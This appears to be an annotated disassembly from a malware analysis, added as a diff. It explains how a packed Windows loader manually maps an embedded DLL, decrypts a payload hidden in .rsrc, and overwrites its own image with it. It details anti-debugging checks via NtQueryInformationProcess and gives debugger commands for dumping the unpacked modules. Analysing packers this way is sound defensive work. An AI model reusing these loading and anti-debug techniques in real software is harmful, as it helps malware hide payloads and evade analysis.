@@ -1,0 +1,321 @@
+The module goal is to load the final module (witch will overload this one) and run its EP.
+The loading process performs as following:
+1. Loads supportive dll (dll_overloader) which PE file image is located in .text sect and
+   initialize it (via calling its EP). The loading proc load_overloader() checks debugger
+   existance to perform successfully. The dll is usually located at 0x10000000 (but may be reloced).
+2. Calls loaded lib export: dll_overloader!vovr(). The export proc loads the final module
+   which will overload the existing one (both have located their image bases at 0x400000).
+   The export proc checks debugger existance to perform successfully. The PE file image
+   of the final (overloading) module is located in .rsrc sect of this module and is encrypted.
+   It's a duty of this module to decrypt it and pass to dll_overloader!vovr() decrypted.
+3. Finally dll_overloader!vovr() jmps to EP of the final module.
+
+Loaded module description struct (used by this module & dll_overloader):
+  struct ldmon_desc
+  {
+    dword pe_hdr,        // start of the PE header of the loaded module
+    dword img_base,      // base of the loaded module
+    dword *imp_mods_tab, // a table of module handles imported by the loaded module
+    dword n_imp_mods,    // num of entries in imp_mods_tab[]
+    dword ep_called
+  }
+
+;
+; main module's main()  (called from MS runtime lib)
+;
+00410830 55              push    ebp
+00410831 8bec            mov     ebp,esp
+00410833 83ec10          sub     esp,10h
+00410836 53              push    ebx
+00410837 56              push    esi
+00410838 57              push    edi
+00410839 8d05fc4258bc    lea     eax,ds:[0BC5842FCh]
+0041083f 0533c5bc56      add     eax,56BCC533h
+00410844 a1901d4000      mov     eax,dword ptr [image00000000_00400000+0x1d90 (00401d90)]
+00410849 a34c814100      mov     dword ptr [image00000000_00400000+0x1814c (0041814c)],eax
+0041084e a1941d4000      mov     eax,dword ptr [image00000000_00400000+0x1d94 (00401d94)]
+00410853 a348814100      mov     dword ptr [image00000000_00400000+0x18148 (00418148)],eax
+00410858 8d0556e62e87    lea     eax,ds:[872EE656h]
+0041085e 05bc21e68b      add     eax,8BE621BCh
+00410863 e8b0030000      call    image00000000_00400000+0x10c18 (00410c18)                  ; ldmon_desc = load_overloader()
+00410868 85c0            test    eax,eax
+0041086a 7441            je      image00000000_00400000+0x108ad (004108ad)                  ; if (ldmon_desc==NULL) goto finish_err
+0041086c 8bc8            mov     ecx,eax
+0041086e e80d050000      call    image00000000_00400000+0x10d80 (00410d80)                  ; get_export(ecx:ldmon_desc): returns addr of dll_overloader!vovr()
+00410873 8b0d48814100    mov     ecx,dword ptr [image00000000_00400000+0x18148 (00418148)]
+00410879 894dfc          mov     dword ptr [ebp-4],ecx                                      ; sizeof(ovrmod_img_data)
+0041087c 8b0d4c814100    mov     ecx,dword ptr [image00000000_00400000+0x1814c (0041814c)]
+00410882 8945f4          mov     dword ptr [ebp-0Ch],eax                                    ; dll_overloader!vovr
+00410885 894df8          mov     dword ptr [ebp-8],ecx                                      ; ovrmod_img_data
+00410888 60              pushad
+00410889 8b4dfc          mov     ecx,dword ptr [ebp-4]
+0041088c 8b75f8          mov     esi,dword ptr [ebp-8]
+0041088f 8d05a01d4000    lea     eax,[image00000000_00400000+0x1da0 (00401da0)]
+00410895 ffd0            call    eax                                                        ; decode_ovrmod_img_data(esi:ovrmod_img_data, ecx:sizeof(ovrmod_img_data)): obfuscated proc
+00410897 61              popad
+00410898 8d45f0          lea     eax,[ebp-10h]
+0041089b 50              push    eax                                                        ; &ovrmod_img_file_len
+0041089c e8d8feffff      call    image00000000_00400000+0x10779 (00410779)
+
+; final (overloading) module's PE file is ready to dump at this point:
+; .writemem final.exe @eax Ldwo(@ebp-10)
+004108a1 50              push    eax                                                        ; ovrmod_img_file
+004108a2 68fecaadde      push    0DEADCAFEh
+004108a7 ff55f4          call    dword ptr [ebp-0Ch]                                        ; dll_overloader!vovr(0xDEADCAFE, ovrmod_img_file)
+004108aa 83c40c          add     esp,0Ch
+finish_err:
+004108ad 5f              pop     edi
+004108ae 33c0            xor     eax,eax
+004108b0 5e              pop     esi
+004108b1 40              inc     eax
+004108b2 5b              pop     ebx
+004108b3 c9              leave
+004108b4 c21000          ret     10h
+
+;
+; load_overloader()
+; Load module of dll_overloader and init it by calling it EP
+;
+00410c18 6a14            push    14h
+00410c1a 6800e04100      push    offset image00000000_00400000+0x1e000 (0041e000)           ; set seh
+00410c1f e8ec240000      call    image00000000_00400000+0x13110 (00413110)
+00410c24 8d055accca0a    lea     eax,ds:[0ACACC5Ah]
+00410c2a 05d53b4a08      add     eax,84A3BD5h
+00410c2f b84d5a0000      mov     eax,5A4Dh
+
+; By definition:
+;   ldmod_img_file:
+;       Address of loaded modle's PE file (00401ec0: in the loading module .text section; offset 0xec0)
+;   ldmod_img_base:
+;       Loaded module's image base (usually 0x10000000 as stated in
+;       ldmod_img_file->optional_header->ImageBase but may be reloc'ed)
+;
+; dll_overloader module's PE file is ready to dump at this point (length: headers size + sects' raw sizes):
+; .writemem dll_overloader.dll 0x00401ec0 L(0x400+0x6A00+0x4800+0xE00+0x200+0x2200)
+00410c34 663905c01e4000  cmp     word ptr [image00000000_00400000+0x1ec0 (00401ec0)],ax
+00410c3b 0f8537010000    jne     image00000000_00400000+0x10d78 (00410d78)                  ; if (ldmod_img_file->DOSheader->e_magic=="MZ") goto finish
+00410c41 a1fc1e4000      mov     eax,dword ptr [image00000000_00400000+0x1efc (00401efc)]
+00410c46 8db0c01e4000    lea     esi,image00000000_00400000+0x1ec0 (00401ec0)[eax]
+00410c4c 8975e4          mov     dword ptr [ebp-1Ch],esi                                    ; ldmod_img_file->PEHeader == ldmod_img_file + ldmod_img_file->DOSheader->e_lfanew
+00410c4f 813e50450000    cmp     dword ptr [esi],4550h
+00410c55 0f851d010000    jne     image00000000_00400000+0x10d78 (00410d78)                  ; if(ldmod_img_file->PEHeader->Magic==IMAGE_NT_SIGNATURE) goto finish
+00410c5b 6a40            push    40h                                                        ; arg: PAGE_EXECUTE_READWRITE
+00410c5d 6800200000      push    2000h                                                      ; arg: MEM_RESERVE
+00410c62 ff7650          push    dword ptr [esi+50h]                                        ; arg: ldmod_img_file->PEHeader->SizeOfImage
+00410c65 ff7634          push    dword ptr [esi+34h]                                        ; arg: ldmod_img_file->PEHeader->ImageBase
+00410c68 8b3d10a04100    mov     edi,dword ptr [image00000000_00400000+0x1a010 (0041a010)]
+00410c6e ffd7            call    edi                                                        ; kernel32!VirtualAlloc(): reserve virt. addr space for the loaded module
+00410c70 8bd8            mov     ebx,eax
+00410c72 895de0          mov     dword ptr [ebp-20h],ebx                                    ; ldmod_img_base
+00410c75 85db            test    ebx,ebx
+00410c77 751a            jne     image00000000_00400000+0x10c93 (00410c93)
+00410c79 6a40            push    40h
+00410c7b 6800200000      push    2000h
+00410c80 ff7650          push    dword ptr [esi+50h]
+00410c83 50              push    eax
+00410c84 ffd7            call    edi                                                        ; kernel32!VirtualAlloc(): try alloc at other base addr if ImageBase is occupied
+00410c86 8bd8            mov     ebx,eax
+00410c88 8945e0          mov     dword ptr [ebp-20h],eax
+00410c8b 85db            test    ebx,ebx
+00410c8d 0f84e5000000    je      image00000000_00400000+0x10d78 (00410d78)
+; virtual memory reserved
+00410c93 6a14            push    14h
+00410c95 6a00            push    0
+00410c97 ff1528a04100    call    dword ptr [image00000000_00400000+0x1a028 (0041a028)]      ; proc_heap = kernel32!GetProcessHeap()
+00410c9d 50              push    eax
+
+; allocate memory for ldmon_desc struct (5 dwords) and init it
+00410c9e ff1524a04100    call    dword ptr [image00000000_00400000+0x1a024 (0041a024)]      ; ldmon_desc = ntdll!RtlAllocateHeap(proc_heap, 0, 0x14): allocates 0x14 bytes
+00410ca4 8bf8            mov     edi,eax
+00410ca6 897ddc          mov     dword ptr [ebp-24h],edi                                    ; ldmon_desc
+00410ca9 895f04          mov     dword ptr [edi+4],ebx                                      ; ldmon_desc->img_base = ldmod_img_base
+00410cac 33c0            xor     eax,eax
+00410cae 89470c          mov     dword ptr [edi+0Ch],eax
+00410cb1 894708          mov     dword ptr [edi+8],eax
+00410cb4 894710          mov     dword ptr [edi+10h],eax
+00410cb7 6a40            push    40h
+00410cb9 6800100000      push    1000h                                                      ; arg: MEM_COMMIT
+00410cbe ff7650          push    dword ptr [esi+50h]                                        ; arg: ldmod_img_file->PEHeader->SizeOfImage
+00410cc1 53              push    ebx                                                        ; arg: ldmod_img_base
+00410cc2 ff1510a04100    call    dword ptr [image00000000_00400000+0x1a010 (0041a010)]      ; kernel32!VirtualAlloc(): commits SizeOfImage
+00410cc8 6a40            push    40h
+00410cca 6800100000      push    1000h                                                      ; arg: MEM_COMMIT
+00410ccf ff7654          push    dword ptr [esi+54h]                                        ; arg: ldmod_img_file->PEHeader->SizeOfHeaders
+00410cd2 53              push    ebx                                                        ; arg: ldmod_img_base
+00410cd3 ff1510a04100    call    dword ptr [image00000000_00400000+0x1a010 (0041a010)]      ; kernel32!VirtualAlloc(): commits SizeOfHeaders
+00410cd9 8bf0            mov     esi,eax                                                    ; ldmod_img_base
+00410cdb 8b4de4          mov     ecx,dword ptr [ebp-1Ch]
+00410cde 8b4954          mov     ecx,dword ptr [ecx+54h]
+00410ce1 030dfc1e4000    add     ecx,dword ptr [image00000000_00400000+0x1efc (00401efc)]
+00410ce7 51              push    ecx                                                        ; hdrs_size = ldmod_img_file->PEHeader->SizeOfHeaders + ldmod_img_file->DOSheader->e_lfanew
+00410ce8 68c01e4000      push    offset image00000000_00400000+0x1ec0 (00401ec0)
+00410ced 56              push    esi
+00410cee e8fd020000      call    image00000000_00400000+0x10ff0 (00410ff0)                  ; memcpy(ldmod_img_base, ldmod_img_file, hdrs_size): copy headers (DOS&PE)
+00410cf3 a1fc1e4000      mov     eax,dword ptr [image00000000_00400000+0x1efc (00401efc)]
+00410cf8 03c6            add     eax,esi                                                    ; ldmod_img_base->PEHeader == ldmod_img_base + ldmod_img_base->DOSheader->e_lfanew
+00410cfa 8907            mov     dword ptr [edi],eax                                        ; ldmon_desc->pe_hdr = ldmod_img_base->PEHeader
+00410cfc 895834          mov     dword ptr [eax+34h],ebx                                    ; ldmod_img_base->PEHeader->ImageBase = ldmod_img_base
+00410cff 57              push    edi
+00410d00 8b75e4          mov     esi,dword ptr [ebp-1Ch]
+00410d03 8bd6            mov     edx,esi
+00410d05 e8adfbffff      call    image00000000_00400000+0x108b7 (004108b7)                  ; copy_sects(edx:ldmod_img_file->PEHeader, ldmon_desc)
+00410d0a 83c410          add     esp,10h
+00410d0d 8bd3            mov     edx,ebx
+00410d0f 2b5634          sub     edx,dword ptr [esi+34h]
+00410d12 8365fc00        and     dword ptr [ebp-4],0
+00410d16 85d2            test    edx,edx
+00410d18 7407            je      image00000000_00400000+0x10d21 (00410d21)                  ; if (ldmod_img_base->PEHeader->ImageBase == ldmod_img_file->PEHeader->ImageBase) no reloc
+00410d1a 8bcf            mov     ecx,edi
+00410d1c e849fdffff      call    image00000000_00400000+0x10a6a (00410a6a)                  ; reloc(ecx:ldmon_desc)
+00410d21 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
+00410d28 eb14            jmp     image00000000_00400000+0x10d3e (00410d3e)
+
+00410d2a 33c0            xor     eax,eax
+00410d2c 40              inc     eax
+00410d2d c3              ret
+00410d2e 8b65e8          mov     esp,dword ptr [ebp-18h]
+00410d31 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
+00410d38 8b5de0          mov     ebx,dword ptr [ebp-20h]
+00410d3b 8b7ddc          mov     edi,dword ptr [ebp-24h]
+
+00410d3e 8bcf            mov     ecx,edi
+00410d40 e8b7fdffff      call    image00000000_00400000+0x10afc (00410afc)
+00410d45 85c0            test    eax,eax
+00410d47 7428            je      image00000000_00400000+0x10d71 (00410d71)                  ; if (!load_imports(ecx:ldmon_desc)) goto finish_err
+00410d49 8bcf            mov     ecx,edi
+00410d4b e861fcffff      call    image00000000_00400000+0x109b1 (004109b1)
+00410d50 8b07            mov     eax,dword ptr [edi]
+00410d52 8b4028          mov     eax,dword ptr [eax+28h]
+00410d55 85c0            test    eax,eax
+00410d57 7414            je      image00000000_00400000+0x10d6d (00410d6d)                  ; is ldmod_img_base->PEHeader->AddressOfEntryPoint provided?
+00410d59 03c3            add     eax,ebx                                                    ; EP
+00410d5b 7414            je      image00000000_00400000+0x10d71 (00410d71)
+00410d5d 6a00            push    0
+00410d5f 33f6            xor     esi,esi
+00410d61 46              inc     esi
+00410d62 56              push    esi
+00410d63 53              push    ebx
+00410d64 ffd0            call    eax                                                        ; EP(ldmod_img_base, 1, 0)
+00410d66 85c0            test    eax,eax
+00410d68 7407            je      image00000000_00400000+0x10d71 (00410d71)                  ; EP() must finish with ret !=0
+00410d6a 897710          mov     dword ptr [edi+10h],esi                                    ; ldmon_desc->ep_called = 1
+00410d6d 8bc7            mov     eax,edi                                                    ; return ldmon_desc
+00410d6f eb09            jmp     image00000000_00400000+0x10d7a (00410d7a)
+
+finish_err:
+00410d71 8bcf            mov     ecx,edi
+00410d73 e88d000000      call    image00000000_00400000+0x10e05 (00410e05)                  ; free loaded module
+finish:
+00410d78 33c0            xor     eax,eax
+00410d7a e8d6230000      call    image00000000_00400000+0x13155 (00413155)                  ; restore seh
+00410d7f c3              ret
+
+;
+; copy_sects(edx:file_pe_hdr, ldmon_desc)
+;   file_pe_hdr: PE header of a file being loaded (its sects are copied)
+;   ldmon_desc: pe_hdr, img_base - are set
+;
+; Copies sections from PE file with 'file_pe_hdr' into destination described by 'ldmon_desc'.
+; If a debugger is present (check via NtQueryInformationProcess()) the sections are not copied.
+;
+; NOTE: The func wrongly sets VirtualSize to actual sect's base address (BUG)!
+;
+004108b7 55              push    ebp
+004108b8 8bec            mov     ebp,esp
+004108ba 83ec10          sub     esp,10h
+004108bd 53              push    ebx
+004108be 8b5d08          mov     ebx,dword ptr [ebp+8]
+004108c1 56              push    esi
+004108c2 8b03            mov     eax,dword ptr [ebx]                                        ; ldmon_desc->pe_hdr
+004108c4 57              push    edi
+004108c5 0fb77014        movzx   esi,word ptr [eax+14h]
+004108c9 8bfa            mov     edi,edx
+004108cb 8b5304          mov     edx,dword ptr [ebx+4]                                      ; ldmon_desc->img_base
+004108ce 33db            xor     ebx,ebx
+004108d0 33c9            xor     ecx,ecx
+004108d2 663b5806        cmp     bx,word ptr [eax+6]
+004108d6 8b5d08          mov     ebx,dword ptr [ebp+8]                                      ; ldmon_desc
+004108d9 897df0          mov     dword ptr [ebp-10h],edi
+004108dc 8955f8          mov     dword ptr [ebp-8],edx
+004108df 894dfc          mov     dword ptr [ebp-4],ecx                                      ; i = 0 (index)
+004108e2 0f83c4000000    jae     image00000000_00400000+0x109ac (004109ac)                  ; if (ldmon_desc->pe_hdr->NumberOfSections<=0) goto finish
+004108e8 83c628          add     esi,28h
+004108eb 03f0            add     esi,eax                                                    ; ldmon_desc->sect_tab[0]->SizeOfRawData
+sects_loop:
+004108ed 833e00          cmp     dword ptr [esi],0
+004108f0 7530            jne     image00000000_00400000+0x10922 (00410922)                  ; if (ldmon_desc->sect_tab[i]->SizeOfRawData!=0) sect to be copied
+; memory alloc only
+004108f2 8b7f38          mov     edi,dword ptr [edi+38h]                                    ; file_pe_hdr->SectionAlignment
+004108f5 85ff            test    edi,edi
+004108f7 0f8e97000000    jle     image00000000_00400000+0x10994 (00410994)
+004108fd 8b46fc          mov     eax,dword ptr [esi-4]
+00410900 6a40            push    40h
+00410902 6800100000      push    1000h
+00410907 57              push    edi
+00410908 03c2            add     eax,edx
+0041090a 50              push    eax                                                        ; aligned base of the ith sect
+0041090b ff1510a04100    call    dword ptr [image00000000_00400000+0x1a010 (0041a010)]      ; kernel32!VirtualAlloc()
+00410911 57              push    edi
+00410912 6a00            push    0
+00410914 50              push    eax
+00410915 8946f8          mov     dword ptr [esi-8],eax                                      ; BUG: ldmon_desc->sect_tab[i]->VirtualSize = ith sect base
+00410918 e843060000      call    image00000000_00400000+0x10f60 (00410f60)
+0041091d 83c40c          add     esp,0Ch
+00410920 eb6c            jmp     image00000000_00400000+0x1098e (0041098e)
+; sect coping
+00410922 8b46fc          mov     eax,dword ptr [esi-4]
+00410925 6a40            push    40h
+00410927 6800100000      push    1000h
+0041092c ff36            push    dword ptr [esi]
+0041092e 03c2            add     eax,edx
+00410930 50              push    eax                                                        ; ith sect base
+00410931 ff1510a04100    call    dword ptr [image00000000_00400000+0x1a010 (0041a010)]      ; kernel32!VirtualAlloc(): commit ith sect size
+00410937 83650800        and     dword ptr [ebp+8],0                                        ; dbg_port=0
+0041093b 6888dc4100      push    offset image00000000_00400000+0x1dc88 (0041dc88)
+00410940 8bf8            mov     edi,eax
+00410942 ff1514a04100    call    dword ptr [image00000000_00400000+0x1a014 (0041a014)]      ; kernel32!LoadLibraryW(L"ntdll.dll")
+00410948 689cdc4100      push    offset image00000000_00400000+0x1dc9c (0041dc9c)
+0041094d 50              push    eax
+0041094e ff1508a04100    call    dword ptr [image00000000_00400000+0x1a008 (0041a008)]      ; kernel32!GetProcAddress("NtQueryInformationProcess")
+00410954 85c0            test    eax,eax
+00410956 7413            je      image00000000_00400000+0x1096b (0041096b)
+00410958 6a00            push    0
+0041095a 6a04            push    4
+0041095c 8d4d08          lea     ecx,[ebp+8]
+0041095f 51              push    ecx                                                        ; &dbg_port
+00410960 6a07            push    7
+00410962 6aff            push    0FFFFFFFFh
+00410964 ffd0            call    eax                                                        ; NtQueryInformationProcess(0xFFFFFFFF, ProcessDebugPort, sizeof(dword), NULL)
+00410966 8945f4          mov     dword ptr [ebp-0Ch],eax
+00410969 eb03            jmp     image00000000_00400000+0x1096e (0041096e)
+0041096b 8b45f4          mov     eax,dword ptr [ebp-0Ch]
+0041096e 85c0            test    eax,eax
+00410970 7505            jne     image00000000_00400000+0x10977 (00410977)
+00410972 394508          cmp     dword ptr [ebp+8],eax
+00410975 7514            jne     image00000000_00400000+0x1098b (0041098b)                  ; if (dbg_port!=0) goto dbg_detected
+; no debugger detected
+00410977 ff36            push    dword ptr [esi]
+00410979 8b4604          mov     eax,dword ptr [esi+4]
+0041097c 05c01e4000      add     eax,offset image00000000_00400000+0x1ec0 (00401ec0)
+00410981 50              push    eax
+00410982 57              push    edi
+00410983 e868060000      call    image00000000_00400000+0x10ff0 (00410ff0)                  ; memcpy(): copy section
+00410988 83c40c          add     esp,0Ch
+dbg_detected:
+0041098b 897ef8          mov     dword ptr [esi-8],edi                                      ; BUG: ldmon_desc->sect_tab[i]->VirtualSize = ith sect base
+0041098e 8b55f8          mov     edx,dword ptr [ebp-8]
+00410991 8b4dfc          mov     ecx,dword ptr [ebp-4]
+00410994 8b03            mov     eax,dword ptr [ebx]                                        ; ldmon_desc->pe_hdr
+00410996 8b7df0          mov     edi,dword ptr [ebp-10h]
+00410999 0fb74006        movzx   eax,word ptr [eax+6]
+0041099d 41              inc     ecx
+0041099e 83c628          add     esi,28h
+004109a1 894dfc          mov     dword ptr [ebp-4],ecx                                      ; i++
+004109a4 3bc8            cmp     ecx,eax
+004109a6 0f8c41ffffff    jl      image00000000_00400000+0x108ed (004108ed)                  ; (i < ldmon_desc->pe_hdr->NumberOfSections) goto sects_loop
+finish:
+004109ac 5f              pop     edi
+004109ad 5e              pop     esi
+004109ae 5b              pop     ebx
+004109af c9              leave
+004109b0 c3              ret
